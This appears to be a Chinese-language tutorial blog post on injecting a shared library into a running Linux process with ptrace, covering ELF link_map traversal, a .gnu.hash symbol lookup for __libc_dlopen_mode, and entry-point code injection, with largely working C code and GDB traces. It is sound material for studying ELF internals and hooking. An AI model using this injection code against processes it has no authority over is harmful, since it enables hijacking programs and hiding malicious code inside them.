## 前言

在学习 `hook` 过程中, 有一个种方法是 `PLT` 注入, `PLT` 注入前的必要工作是需恶意的 `so` 注入, 找了很多关于注入的资料发现绝大部分实现都已经不适用, 几个方面因素, 一部分是因为 `ELF` 文件结构变化, 一部分是因为 `glibc` 调用的函数改变, 另外有很多是由于注入位置不对导致不够通用, 下面会详细介绍几种情况.

`so` 注入是对学习 `ELF` 结构极好的实践.

本文中大部分 refs 和 一起文档参考都在仓库 [pwn2exploit](https://github.com/jmpews/pwn2exploit).

## 参考链接

#### ELF基础

```
#包含新的.gnu.hash, 新的hash算法以及新的符号地址计算方法
ELF文件知识
#大部分ELF相关参考文档都在 `refs/elf` 有包含, 比较多所以这里不重述, 只提几个极为重要的参考文档
#ELF标准文档, 不包含 `.gnu.hash` 相关知识
https://refspecs.linuxbase.org/elf/elf.pdf
#详细解释.gnu.hash 相关知识
https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections
#__kernel_vsyscall 介绍(这个在后面的代码注入覆盖了系统调用, 会有一个坑)
http://www.trilithium.com/johan/2005/08/linux-gate/
#内核 hash 和 bucket 相关概念
http://www.nowamagic.net/academy/detail/3008086
```

#### GDB/*技巧

```
#查看哪里触发的 __kernel_vsyscall 系统函数调用(其中的2个地址为 __kernel_vsyscall 区间)
watch ($eip > 0xb770c418) && ($eip < 0xb770c42b)
#必备插件
peda
#查看系统arch相关常量
echo | gcc -E -dM - | grep 64
#查看ld详细信息
ld --verbose
```

#### 注入实例

```
#旧注入实例, 但是具有参考价值.
http://phrack.org/issues/59/8.html#article(国内很多文章都是参考这篇)
http://www.cnblogs.com/LittleHann/p/4594641.html(针对phrack的翻译)
http://grip2.blogspot.jp/2006/12/blog-post.html(针对phrack的翻译)

#可用注入实例, 但注入方法有限制, 并且注入位置不对只能在特定情况进行注入
https://github.com/gaffe23/linux-inject

#没有采用代码注入, 采用的是修改寄存器的eip到指定函数地址, 动态加载函数不再适用
http://www.xfocus.net/articles/200208/438.html
```

## 注入理论

其实本质就一句话, "调用dlopen加载外部so文件", 或者说就一句代码 `dlopen("evil.so",RTLD_LAZY);`. 但是显然不可能对正在执行的程序执行 `dlopen` 操作, 所以:

#### 问题1：如何能够接触到正在执行进程的内存空间.

通过 `ptrace`, `ptrace` 可以让目标 `pid` 进程成为当前进程的子进程, 进而可以访问目标进程的内存空间, 寄存器, 并且可以向目标内存空间写内容. 需要了解 `ptrace` 函数的几个关键宏.

```
参考链接 https://linux.die.net/man/2/ptrace
PTRACE_ATTACH 挂载目标pid
PTRACE_CONT 让子程序继续运行
PTRACE_PEEKTEXT 读取内容
PTRACE_POKETEXT 写入内容
```

ok, 现在既然已经可以读写目标进程的内存空间了, 下一步已经就是在目标内存空间调用 `dlopen`.既然要调用 `dlopen`, 肯定需要 `dlopen` 函数符号的地址. 但是默认 `libc-2.19.so` 是不包含 `dlopen`, 只有 `__libc_dlopen_mode`.

```
➜  elf readelf --dyn-syms /lib/i386-linux-gnu/libdl.so.2 | grep dlopen
    29: 00000d30   101 FUNC    GLOBAL DEFAULT   13 dlopen@@GLIBC_2.1
    30: 00001900   108 FUNC    GLOBAL DEFAULT   13 dlopen@GLIBC_2.0
➜  elf readelf --dyn-syms /lib/i386-linux-gnu/libc-2.19.so | grep dlopen
  2294: 00123ae0    91 FUNC    GLOBAL DEFAULT   12 __libc_dlopen_mode@@GLIBC_PRIVATE
```

这两个函数实现的是一样的效果, 其最终都是调用的 `_dl_open`, 可以通过 `glic` 源码查看相关调用过程, 因此可以通过 `void * __libc_dlopen_mode (const char *name, int mode)` 加载外部so. 所以现在现在的问题是:

#### 问题2: `__libc_dlopen_mode` 的内存地址是多少(如何查找)

有一种方法是, 通过查看 `cat /proc/1234/maps` 的加载地址, 加上函数符号在文件中的偏移来得到, 这里并不打算采用这种方法, 而是通过解析 `ELF` 文件结构得到 `__libc_dlopen_mode` 函数符号的地址. (这里需要比较多的 `ELF` 的文件结构的知识, 可以参考前面的\<ELF文件知识\>)

ok, 先介绍几个关于 `ELF` 的结构体, 这些结构体都在 `eglibc-2.19/elf/elf.h` 有相应的定义, 实在是不想贴所有结构体的定义, 但是如果不贴又对整个不太好理解.

```
//eglibc-2.19/elf/link.h

/* Structure describing a loaded shared object.  The `l_next' and `l_prev'
   members form a chain of all the shared objects loaded at startup.

   These data structures exist in space used by the run-time dynamic linker;
   modifying them may have disastrous results.  */

struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */
    //共享库加载地址
    ElfW(Addr) l_addr;      /* Difference between the address in the ELF
                   file and the addresses in memory.  */
    //共享库名称, 绝对路径
    char *l_name;       /* Absolute file name object was found in.  */
    //动态链接section的地址
    ElfW(Dyn) *l_ld;        /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  }
```

`link_map` 的作用就是记录程序加载的所有共享库的链表, 当需要查找符号时就需要遍历该链表找到对应的共享库.

```
//http://www.eglibc.org/cgi-bin/viewvc.cgi/branches/eglibc-2_19/libc/elf/elf.h?view=markup
//eglibc-2.19/elf/elf.h

ignore...
```

`Elf32_Ehdr` 是 `ELF` 头, 注入需要使用 `Elf32_Ehdr->e_phoff` 取得正在执行进程的 `Program header table`.

**这里需要注意的**, `ELF` 文件是按照 `Segment` 加载到内存中, 只会加载 `$ readelf -l test` 中的对应 `section`, 而比如 `section header table` 是不会被加载的, 通过查看 `section header table` 并不在 `$ readelf -l test` 内存映射的区间之内验证, 所以是不能通过 `section header table` 对执行中的进程进行解析.

`Elf32_Phdr` 是 `ELF` 的 `Segment` 对应结构, `Segment` 是相似属性的 `section` 集合, 仅是概念性的划分. 关于 `segment` 的内存页对齐等细节, 这里不进行详细介绍, 如有兴趣请参考 \<程序员自我修养\>. 注入需要使用 `Elf32_Phdr->p_type` 和 `Elf32_Phdr->p_vaddr`, 判断并取得 `Dynamic Segment`.

`Elf32_Dyn` 是有关动态链接的 `section` 结构, 属于 `Dynamic Segment`, `so` 注入需要根据它取得所需要的 `section`.

`Elf32_Sym` 是符号表的结构体, 需要根据 `Elf32_Sym->st_name` 拿到该符号在 `.dynstr` 对应的位置.

ok, 到目前为止几个我们需要使用的结构体都大致简单介绍了下. 下面开始具体的符号的地址查找过程.

因为 `__libc_dlopen_mode` 是在 `libc.so.6` 动态库中, 所以需要先找到 `libc.so.6`, 在介绍 `link_map` 时说过, 它记录目标进程加载的所有的动态库, 所以只要遍历 `link_map` 就可以找到 `libc.so.6`. 所以现在的问题是:

#### 问题3: 如何找到 `link_map` 地址

`link_map` 位于 `.got.plt` 表的第 2 位置(请查看关于 `ELF` 文件结构的知识), 而 `.got.plt` 表的地址位于 `Elf32_Dyn->d_tag == DT_PLTGOT` 的 `Elf32_Dyn` 中, ·而 `Dynamic Segment` 的地址位于 `Elf32_Phdr->p_type == PT_DYNAMIC` 的 `Elf32_Phdr` 中, 而 `Program header table` 的地址位于 `Elf32_Ehdr->e_phoff`, 这样就可以逆转整个过程, 以取得 `link_map` 的地址.

```

struct link_map *
locate_linkmap(int pid)
{
    ElfW(Ehdr) ehdr;
    ElfW(Phdr) phdr;
    ElfW(Dyn) dyn;
	struct link_map *l = malloc(sizeof(struct link_map));
	ElfW(Addr) phdr_addr , dyn_addr , map_addr, gotplt_addr, text_addr;

	ptrace_read(pid, PROGRAM_LOAD_ADDRESS, &ehdr , sizeof(ElfW(Ehdr)));

	phdr_addr = PROGRAM_LOAD_ADDRESS + ehdr.e_phoff;

    ptrace_read(pid , phdr_addr, &phdr , sizeof(ElfW(Phdr)));

	while ( phdr.p_type != PT_DYNAMIC ) {
        ptrace_read(pid, phdr_addr += sizeof(ElfW(Phdr)), &phdr, sizeof(ElfW(Phdr)));
	}

	/* now go through dynamic section until we find address of GOT.PLT */
    ptrace_read(pid, phdr.p_vaddr, &dyn, sizeof(ElfW(Dyn)));

	dyn_addr = phdr.p_vaddr;

	while ( dyn.d_tag != DT_PLTGOT ) {
		ptrace_read(pid, dyn_addr += sizeof(ElfW(Dyn)), &dyn, sizeof(ElfW(Dyn)));
	}

    /* link_map address, .got.plt address */
	gotplt_addr = dyn.d_un.d_ptr;

	/* now just read first link_map item and return it */
	ptrace_read(pid, gotplt_addr + sizeof(ElfW(Addr)), &map_addr , sizeof(ElfW(Addr)));
	ptrace_read(pid , map_addr, l , sizeof(struct link_map));

	return l;
}
```

ok, 现在我们已经找到对应的动态库的 `link_map`, 现在我们就需要从 `link_map`, 找到 `__libc_dlopen_mode` 函数符号的地址, 所以现在的问题是:

#### 问题4: 如何根据 `符号名字符串` 和 `link_map` 找符号的内存地址

当然可以通过 `$ readelf --dyn-syms /lib/i386-linux-gnu/libc-2.19.so | grep __libc_dlopen_mode` 找到函数符号在文件中的偏移加上动态库的加载地址, 就可以得到该符号的在内存中的地址. 这种方式并不通用, 比如: `so` 文件丢失, 不存在 `readelf` 命令.

ok, 那么现在的方法就是遍历 `.dynsym` 表, 查找符号名称为 `__libc_dlopen_mode` 的 `Elf32_Sym`(其实是查找`Elf32_Sym->st_name` 在 `.dynstr` 中的索引对应的字符串). \*\* 然而 `.dynsym` 的长度是多少, 或者说遍历停止的条件? \*\*.如果要得到 `.dynsym` 的长度, 也只能读 `so` 文件, 根据一些没有加载到内存中的但是存在于文件中的内容解析, 比如: 根据 `section header table` 找到 `.dynsym` 的 `Elf32_Shdr` 结构,  `Elf32_Shdr->sh_size /Elf32_Shdr->sh_entsize` 即为符号表的长度. 所以这种方法也不可行.

ok, 另一种方法就是根据 `glibc` 中的方法进行查找符号地址, 这里需要用 `.gnu.hash` 表, 同时在 `glibc` 中 利用 `_dl_lookup_symbol_x -> do_lookup_x` 进行函数符号的地址查找, 关于 `.gnu.hash` 的详细介绍, 请参考 `https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections`, 这里简单提一下, `ELF` 在加载动态库时并不是直接全部解析出所有符号的地址, 而是通过 `PLT` 延迟加载的方式, 在执行的过程中通过查找符号的地址, 这需要利用 `.gnu.hash` 进行 `hash` 算法快速查找. 建议先阅读参考文档中关于 `.gnu.hash` 的介绍, 以及了解关于如何利用 `hash桶` 的方法解决 `hash` 冲突.

下面是 `glibc` 在进行符号查找一段核心代码, 位于 `eglibc-2.19/elf/dl-lookup.c` 中的 `do_lookup_x` 函数中.

```
//http://www.eglibc.org/cgi-bin/viewvc.cgi/branches/eglibc-2_19/libc/elf/dl-lookup.c?view=markup
//eglibc-2.19/elf/dl-lookup.c

  const ElfW(Sym) *sym;
  const ElfW(Addr) *bitmask = map->l_gnu_bitmask;
  if (__builtin_expect (bitmask != NULL, 1))
{
  ElfW(Addr) bitmask_word
    = bitmask[(new_hash / __ELF_NATIVE_CLASS)
          & map->l_gnu_bitmask_idxbits];

  unsigned int hashbit1 = new_hash & (__ELF_NATIVE_CLASS - 1);
  unsigned int hashbit2 = ((new_hash >> map->l_gnu_shift)
               & (__ELF_NATIVE_CLASS - 1));

  if (__builtin_expect ((bitmask_word >> hashbit1)
            & (bitmask_word >> hashbit2) & 1, 0))
    {
      Elf32_Word bucket = map->l_gnu_buckets[new_hash
                         % map->l_nbuckets];
      if (bucket != 0)
    {
      const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];

      do
        if (((*hasharr ^ new_hash) >> 1) == 0)
          {
        symidx = hasharr - map->l_gnu_chain_zero;
        sym = check_match (&symtab[symidx]);
        if (sym != NULL)
          goto found_it;
          }
      while ((*hasharr++ & 1u) == 0);
    }
    }
  /* No symbol found.  */
  symidx = SHN_UNDEF;
}
```

这里有点坑, 就是此时 `link_map` 结构并非 `#include <link.h>` 中的结构, 在 `eglibc-2.19/include/link.h` 中有这么一段代码:

```
#define link_map    link_map_public
#define la_objopen  la_objopen_wrongproto
#include <elf/link.h>
#undef  link_map
#undef  la_objope
```

所以需要我们自己去构造这些结构体变量的成员, 构造的方法可以参考 `eglibc-2.19/elf/dl-lookup.c` 中 `_dl_setup_hash` 函数. 这里附上一段代码作为参考

```

void
internal_function
_dl_setup_hash (struct link_map *map)
{
  Elf_Symndx *hash;

  if (__builtin_expect (map->l_info[DT_ADDRTAGIDX (DT_GNU_HASH) + DT_NUM
                    + DT_THISPROCNUM + DT_VERSIONTAGNUM
                    + DT_EXTRANUM + DT_VALNUM] != NULL, 1))
    {
      Elf32_Word *hash32
    = (void *) D_PTR (map, l_info[DT_ADDRTAGIDX (DT_GNU_HASH) + DT_NUM
                      + DT_THISPROCNUM + DT_VERSIONTAGNUM
                      + DT_EXTRANUM + DT_VALNUM]);
      map->l_nbuckets = *hash32++;
      Elf32_Word symbias = *hash32++;
      Elf32_Word bitmask_nwords = *hash32++;
      /* Must be a power of two.  */
      /* Important!!! */
      assert ((bitmask_nwords & (bitmask_nwords - 1)) == 0);
      map->l_gnu_bitmask_idxbits = bitmask_nwords - 1;
      map->l_gnu_shift = *hash32++;

      map->l_gnu_bitmask = (ElfW(Addr) *) hash32;
      hash32 += __ELF_NATIVE_CLASS / 32 * bitmask_nwords;

      map->l_gnu_buckets = hash32;
      hash32 += map->l_nbuckets;
      map->l_gnu_chain_zero = hash32 - symbias;
      return;
    }

  if (!map->l_info[DT_HASH])
    return;
  hash = (void *) D_PTR (map, l_info[DT_HASH]);

  map->l_nbuckets = *hash++;
  /* Skip nchain.  */
  hash++;
  map->l_buckets = hash;
  hash += map->l_nbuckets;
  map->l_chain = hash;
}
```

这里算法不进行具体的解释, 可以参考下文的对应的实现, 这题提一下本来是参照 `https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections` 实现的符号查找算法, 但总感觉不太标准, 就又按照 `glibc` 实现了一遍, 本质大同小异, 会在代码中做一些对比说明.

这里另外提两点关于 `glibc` 中代码实现风格的, 1. 在 `glibc` 实现关于符号的符号查找的 `hash` 算法的过程中大量利用了 `移位代替取模`, 比如上面的 `bitmask_nwords Must be a power of two`. 这点在下文的具体算法的实现中会有体现. 2. 在 `glibc` 中大量使用宏来处理不同处理器的兼容性问题, 比如 `ElfW(Addr)`, `ElfW` 的定义是:

```
// #include <bits/elfclass.h>
#define __ELF_NATIVE_CLASS 32

// #include <link.h>
#include <bits/elfclass.h>
#define ElfW(type)  _ElfW (Elf, __ELF_NATIVE_CLASS, type)
#define _ElfW(e,w,t)    _ElfW_1 (e, w, _##t)
#define _ElfW_1(e,w,t)  e##w##t
```

`__ELF_NATIVE_CLASS` 定义当前机子的字长, 这样 `ElfW(Addr)` 就被解析为 `Elf32_Addr` 或者 `Elf64_Addr`, 最后根据 `#include <elf.h>` 定义的类型来做处理.

ok, 先放出来关于 `setup_hash` 的实现, 作用就是在解析 `Dynamic Segment` 的过程中顺便完善 `link_map` 结构, 方便下文的 `hash` 算法的使用.

```
void
setup_hash(int pid, struct link_map *map, struct link_map_more *map_more) {
    Elf32_Word *gnu_hash_header = (Elf32_Word *)malloc(sizeof(Elf32_Word) * 4);
    ptrace_read(pid, map_more->gnuhash_addr, gnu_hash_header, sizeof(Elf32_Word) * 4);

    // .gnu.hash
    map_more->nbuckets =gnu_hash_header[0];
    map_more->symndx = gnu_hash_header[1];
    map_more->nmaskwords = gnu_hash_header[2];
    map_more->shift2 = gnu_hash_header[3];
    map_more->bitmask_addr = map_more->gnuhash_addr + 4 * sizeof(Elf32_Word);
    map_more->hash_buckets_addr =  map_more->bitmask_addr + map_more->nmaskwords * sizeof(ElfW(Addr));
    map_more->hash_values_addr = map_more->hash_buckets_addr + map_more->nbuckets * sizeof(Elf32_Word);
}
```
这里根据 `.gnu.hash` 的结构进行解析, 应该没有什么问题.

ok, 再放出关于符号查找 `hash` 算法的具体, 这里整个的核心.

```

//eglibc-2.19/elf/dl-lookup.c
unsigned long
dl_new_hash (const char *s)
{
  unsigned long h = 5381;
  unsigned char c;
  for (c = *s; c != '\0'; c = *++s)
    h = h * 33 + c;
  return h & 0xffffffff;
}

/* seach symbol name in elf(so) */
ElfW(Sym) *
symhash(int pid, struct link_map_more *map_more, const char *symname)
{
	unsigned long c;
	Elf32_Word new_hash, h2;
	unsigned int  hb1, hb2;
	unsigned long n;
    Elf_Symndx symndx;
	ElfW(Addr) bitmask_word;
    ElfW(Addr) addr;
    ElfW(Addr) sym_addr;
    ElfW(Addr) hash_addr;
	char symstr[256];
	ElfW(Sym) * sym = malloc(sizeof(ElfW(Sym)));

	new_hash = dl_new_hash(symname);

	/* new-hash % __ELF_NATIVE_CLASS */
	hb1 = new_hash & (__ELF_NATIVE_CLASS - 1);
	hb2 = (new_hash >> map_more->shift2) & (__ELF_NATIVE_CLASS - 1);

	printf("[*] start gnu hash search:\n\tnew_hash: 0x%x(%u)\n", symname, new_hash, new_hash);

	/* ELFCLASS size */
    //__ELF_NATIVE_CLASS

	/*  nmaskwords must be power of 2, so that allows the modulo operation */
	/* ((new_hash / __ELF_NATIVE_CLASS) % maskwords) */
	n = (new_hash / __ELF_NATIVE_CLASS) & (map_more->nmaskwords - 1);
	printf("\tn: %lu\n", n);

    /* Use hash to quickly determine whether there is the symbol we need */
	addr = map_more->bitmask_addr + n * sizeof(ElfW(Addr));
	ptrace_read(pid, addr, &bitmask_word, sizeof(ElfW(Addr)));
    /* eglibc-2.19/elf/dl-loopup.c:236 */
    /* https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections */
    /* different method same result */
    if(((bitmask_word >> hb1) & (bitmask_word >> hb2) & 1) == 0)
		return NULL;

	/* The first index of `.dynsym` to the bucket .dynsym */
	addr = map_more->hash_buckets_addr + (new_hash % map_more->nbuckets) * sizeof(Elf_Symndx);
	ptrace_read(pid, addr, &symndx, sizeof(Elf_Symndx));
	printf("\thash buckets index: 0x%x(%u), first dynsym index: 0x%x(%u)\n", (new_hash % map_more->nbuckets), (new_hash % map_more->nbuckets), symndx, symndx);

	if(symndx == 0)
		return NULL;

	sym_addr = map_more->dynsym_addr + symndx * sizeof(ElfW(Sym));
	hash_addr = map_more->hash_values_addr + (symndx - map_more->symndx) * sizeof(Elf32_Word);

	printf("[*] start bucket search:\n");
    do
    {
		ptrace_read(pid, hash_addr, &h2, sizeof(Elf32_Word));
		printf("\th2: 0x%x(%u)\n", h2, h2);
        /* 1. hash value same */
        if(((h2 ^ new_hash) >> 1) == 0) {

			sym_addr = map_more->dynsym_addr + ((map_more->symndx + (hash_addr - map_more->hash_values_addr) / sizeof(Elf32_Word)) * sizeof(ElfW(Sym)));
            /* read ElfW(Sym) */
			ptrace_read(pid, sym_addr, sym, sizeof(ElfW(Sym)));
            addr = map_more->dynstr_addr + sym->st_name;
            /* read string */
            ptrace_read(pid, addr, symstr, sizeof(symstr));

            /* 2. name same */
            if(!strcmp(symname, symstr))
                return sym;
        }
		hash_addr += sizeof(sizeof(Elf32_Word));
	} while((h2 & 1u) == 0); // search in same bucket
    return NULL;
}
```

这里介绍下上面算法的流程

首先需要利用 `bitmask` 根据 `Bloom Filter(布隆过滤器)` 判断是否存在于符号表, 这里先放出 wiki 的参考链接 [Bloom Filter][1], 这里简单介绍下 `Bloom Filter`, 它可以在常量时间内判断 `hash_value` 是否存在于 `hash_values_buckets`, 但是它是有误差的, 也就是说如果 `Bloom Filter` 判断出不存在就是一定不在, 但是如果判断存在则可能存在, 仅仅是可能存在, 原因就是因为 `hash` 冲突的存在, 具体参考下 `Bloom Filter` 的原理.

接下来就是根据该符号的 `hash value`, 确定该符号在哪一个 `bucket`, 找到该 `bucket(桶)` 内第一个符号结构, 之后便开始在桶内进行符号查找.

接下来就是桶内查找, 需要满足两个条件, 1. `hash value` 相同 2. 字符串相同.

剩下的大家可以通过阅读来具体理解下, 大部分我都加了注释.

ok, 到这一步, 就可以拿到 `__libc_dlopen_mode` 的地址了, 然后下一步的问题就是:

#### 问题5: 如何调用 `__libc_dlopen_mode`?

大概有两种思路, 单纯依靠寄存器 `eip` 修改执行位置, 其他寄存器传参数, 这个方法在之前 `_dl_open` 是被定义为 `internal_function`, 也就是通过寄存器传参, 但是对于 `__libc_dlopen_mode` 已经不是寄存器传递参数. 另一个就是注入一段代码, 执行这段代码, 通过正常的函数调用方法调用 `__libc_dlopen_mode`, 执行完毕后恢复这段内存原始代码, 这里主要分析下第二种方法.

既然采用注入代码方法, 那么问题就来了, 代码应该注入到哪里? 可能首先想到的就是注入到当前 `%eip` 的位置, 因为毕竟运行后会恢复为原始内存, 但是有一个问题就是, 假如被覆盖的这块内存在执行的过程中需要被二次使用怎么办, 此时内存代码已经不是原来的代码, 并且还有没有被恢复? 这就是上面说的这种注入方法存在局限性.

这里先给大家放一段目前普遍采用的注入方式, 也就是注入到当前 `%eip` 的位置, 并为大家复现这个情况.

这里采用手动注入一段代码的方式, 用 `gdb attach` 该进程.

```
#include <stdio.h>
int main()
{
     char *evilso = "/vagrant/inject/evil.so";
     while(1)
     {
         printf("Going to sleep...\n");
         sleep(3);
         printf("Wake up\n");
     }
     return 0;
}
```

下面就是相关的分析过程,

```
# 当前gdb挂载点
gdb-peda$ disassemble
Dump of assembler code for function __kernel_vsyscall:
   0xb7700418 <+0>:     push   ecx
   0xb7700419 <+1>:     push   edx
   0xb770041a <+2>:     push   ebp
   0xb770041b <+3>:     mov    ebp,esp
   0xb770041d <+5>:     sysenter
   0xb770041f <+7>:     nop
   0xb7700420 <+8>:     nop
   0xb7700421 <+9>:     nop
   0xb7700422 <+10>:    nop
   0xb7700423 <+11>:    nop
   0xb7700424 <+12>:    nop
   0xb7700425 <+13>:    nop
   0xb7700426 <+14>:    int    0x80
=> 0xb7700428 <+16>:    pop    ebp
   0xb7700429 <+17>:    pop    edx
   0xb770042a <+18>:    pop    ecx
   0xb770042b <+19>:    ret
End of assembler dump.

gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0804844d <+0>:     push   ebp
   0x0804844e <+1>:     mov    ebp,esp
   0x08048450 <+3>:     and    esp,0xfffffff0
   0x08048453 <+6>:     sub    esp,0x20
   0x08048456 <+9>:     mov    DWORD PTR [esp+0x1c],0x8048520
   0x0804845e <+17>:    mov    DWORD PTR [esp],0x8048538
   0x08048465 <+24>:    call   0x8048320 <puts@plt>
   0x0804846a <+29>:    mov    DWORD PTR [esp],0x3
   0x08048471 <+36>:    call   0x8048310 <sleep@plt>
   0x08048476 <+41>:    mov    DWORD PTR [esp],0x804854a
   0x0804847d <+48>:    call   0x8048320 <puts@plt>
   0x08048482 <+53>:    jmp    0x804845e <main+17>
End of assembler dump.

#找到需要加载的so的路径参数
gdb-peda$ x/s 0x8048520
0x8048520:      "/vagrant/inject/evil.so"

#找到__libc_dlopen_mode函数符号的地址
gdb-peda$ x/i __libc_dlopen_mode
0xb7675ae0 <__libc_dlopen_mode>:     push   esi

#手动代码注入后是下面的peda显示, 注意 `ebx`, 当前 `eip` 的内容, 栈的内容的变化.
 [----------------------------------registers-----------------------------------]
EAX: 0xfffffdfc
EBX: 0xb7675ae0 (<__libc_dlopen_mode>:  push   esi)
ECX: 0xbf81f9bc --> 0x2
EDX: 0xb76fd000 --> 0x1aada8
ESI: 0x0
EDI: 0xbf81fa44 --> 0x0
EBP: 0xbf81f9c4 --> 0x10000
ESP: 0xbf81f97c --> 0x8048520 ("/vagrant/inject/evil.so")
EIP: 0xb770b428 (<__kernel_vsyscall+16>:        call   ebx)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb770b424 <__kernel_vsyscall+12>:   nop
   0xb770b425 <__kernel_vsyscall+13>:   nop
   0xb770b426 <__kernel_vsyscall+14>:   int    0x80
=> 0xb770b428 <__kernel_vsyscall+16>:   call   ebx
   0xb770b42a <__kernel_vsyscall+18>:   add    BYTE PTR [eax],al
   0xb770b42c:  add    BYTE PTR [esi],ch
   0xb770b42e:  jae    0xb770b498
   0xb770b430:  jae    0xb770b4a6
Guessed arguments:
arg[0]: 0x8048520 ("/vagrant/inject/evil.so")
arg[1]: 0x1
[------------------------------------stack-------------------------------------]
0000| 0xbf81f97c --> 0x8048520 ("/vagrant/inject/evil.so")
0004| 0xbf81f980 --> 0x1
0008| 0xbf81f984 --> 0xbf81f9bc --> 0x2
0012| 0xbf81f988 --> 0xb7607b70 (<nanosleep+32>:        mov    ebx,edx)
0016| 0xbf81f98c --> 0xb760793d (<sleep+205>:   test   eax,eax)
0020| 0xbf81f990 --> 0xbf81f9bc --> 0x2
0024| 0xbf81f994 --> 0xbf81f9bc --> 0x2
0028| 0xbf81f998 --> 0x0
[------------------------------------------------------------------------------]

#这里我们再加一个watchpoint, 需要监视哪个函数再一次调用了 __kernel_vsyscall, 这段技巧在上面也提到过.
watch ($eip > 0xb7700418) && ($eip < 0xb770042b)

#继续执行 等待触发watchpoint, 查看调用栈, 发现
gdb-peda$ bt
#0  0xb7735418 in __kernel_vsyscall ()
#1  0xb765efde in brk () from /lib/i386-linux-gnu/libc.so.6
#2  0xb765f084 in sbrk () from /lib/i386-linux-gnu/libc.so.6
#3  0xb75f4ccf in __default_morecore () from /lib/i386-linux-gnu/libc.so.6
#4  0xb75f1352 in ?? () from /lib/i386-linux-gnu/libc.so.6
#5  0xb75f2888 in malloc () from /lib/i386-linux-gnu/libc.so.6
#6  0xb75f295f in malloc () from /lib/i386-linux-gnu/libc.so.6
#7  0xb773b026 in local_strdup (s=s@entry=0x8048520 "/vagrant/inject/evil.so")
    at dl-load.c:162
#8  0xb773d4d0 in expand_dynamic_string_token (l=l@entry=0xb7757c28,
    s=s@entry=0x8048520 "/vagrant/inject/evil.so", is_path=is_path@entry=0x0)
    at dl-load.c:429
#9  0xb773e0dc in _dl_map_object (loader=loader@entry=0xb7757c28,
    name=name@entry=0x8048520 "/vagrant/inject/evil.so", type=type@entry=0x2,
    trace_mode=trace_mode@entry=0x0, mode=mode@entry=0x10000001, nsid=0x0)
    at dl-load.c:2538
#10 0xb7748c14 in dl_open_worker (a=0xbfc39228) at dl-open.c:235
#11 0xb7744c06 in _dl_catch_error (objname=objname@entry=0xbfc39220,
    errstring=errstring@entry=0xbfc39224, mallocedp=mallocedp@entry=0xbfc3921f,
    operate=operate@entry=0xb7748b50 <dl_open_worker>, args=args@entry=0xbfc39228)
    at dl-error.c:187
#12 0xb7748644 in _dl_open (file=0x8048520 "/vagrant/inject/evil.so", mode=0x1,
    caller_dlopen=0xb773542a <__kernel_vsyscall+18>, nsid=<optimized out>,
    argc=0x1, argv=0xbfc396a4, env=0xbfc396ac) at dl-open.c:661
#13 0xb769f9ab in ?? () from /lib/i386-linux-gnu/libc.so.6
#14 0xb7744c06 in _dl_catch_error (objname=0xbfc39394, errstring=0xbfc39398,
    mallocedp=0xbfc39393, operate=0xb769f950, args=0xbfc393cc) at dl-error.c:187
#15 0xb769fa9b in ?? () from /lib/i386-linux-gnu/libc.so.6
#16 0xb769fb21 in __libc_dlopen_mode () from /lib/i386-linux-gnu/libc.so.6
#17 0xb773542a in __kernel_vsyscall ()
#18 0xbfc3942c in ?? ()
#19 0x00000000 in ?? ()

# 继续执行失败
```

ok, 这也就不难发现, 为什么说现在的绝大部分注入都是有限制的, 当我们在系统中断函数进行代码注入, 导致在 `__libc_dlopen_mode` 执行过程中需要调用 `malloc` (`eglibc-2.19/elf/dl-lookup.c` 中 `local_strdup`)进行堆空间分配, 但由于此时没有cache, 因而需要触发系统调用使用 `brk` 分配一块堆内存, 这一块具体查看linux内存分配相关的文章, `<程序员的自我修养>` 简单提到过一些关于 `malloc` 堆内存分配.

ok, 现在问题复现了, 需要采用其他方法进行注入, 这里采用的是将代码注入到程序入口点位置, 然后修改 `%eip` 为程序入口点位置, 这样就不会存在影响, 或者查找一块连续的 `nop` 内存块进行注入. 这里直接注入到程序入口点位置.

```

void
inject_code(int pid, char *evilso, ElfW(Addr) dlopen_addr) {
	struct	user_regs_struct regz, regzbak;
	unsigned long len;
	unsigned char *backup = NULL;
	unsigned char *loader = NULL;
	ElfW(Addr) entry_addr;

	setaddr(soloader + 12, dlopen_addr);

	entry_addr = locate_start(pid);
	printf("[+] entry point: 0x%x\n", entry_addr);

	len = sizeof(soloader) + strlen(evilso);
	loader = malloc(sizeof(char) * len);
	memcpy(loader, soloader, sizeof(soloader));
	memcpy(loader+sizeof(soloader) - 1 , evilso, strlen(evilso));

	backup = malloc(len + sizeof(ElfW(Word)));
	ptrace_read(pid, entry_addr, backup, len);

	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
	if(ptrace(PTRACE_GETREGS , pid , NULL , &regzbak) < 0) exit(-1);
	printf("[+] stopped %d at eip:%p, esp:%p\n", pid, regz.eip, regz.esp);

	/* `eip` points to the next instruction, so current instruction is `entry_addr`  */
	regz.eip = entry_addr + 2;

	/* code inject */
	ptrace_write(pid, entry_addr, loader, len);

	/* set eip as entry_point */
	ptrace(PTRACE_SETREGS , pid , NULL , &regz);
	ptrace_cont(pid);

	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
	printf("[+] inject code done %d at eip:%p\n", pid, regz.eip);

	/* restore backup data */
	// ptrace_write(pid,entry_addr, backup, len);
	ptrace(PTRACE_SETREGS , pid , NULL , &regzbak);
}
```

至此所有问题得到解答, `so` 注入完成, 程序已经上传到 `github`.

```
➜  inject gcc -w -o inject /vagrant/inject/inject.c /vagrant/inject/utils.c && sudo ./inject 24506 /vagrant/inject/evil.so
attached to pid 24506
[*] start search '__libc_dlopen_mode':
----------------------------------------------------------------
[+] libaray path: /lib/i386-linux-gnu/libc.so.6
[+] gnu.hash:
        nbuckets: 0x3f3
        symndx: 0xa
        nmaskwords: 0x200
        shift2: 0xe
        bitmask_addr: 0xb75281c8
        hash_buckets_addr: 0xb75289c8
        bitmask_addr: 0xb75281c8                                                                                                                                     [0/1762]
        hash_buckets_addr: 0xb75289c8
        hash_values_addr: 0xb7529994
